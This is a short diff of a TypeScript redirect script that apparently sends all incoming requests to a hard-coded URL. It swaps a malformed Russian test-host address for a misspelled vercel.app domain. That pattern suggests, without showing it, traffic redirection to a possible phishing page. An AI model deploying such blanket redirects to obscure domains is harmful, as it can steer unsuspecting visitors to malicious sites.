@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https//srv233619.hoster-test.ru/red"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://redfcuonliine.vercel.app/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
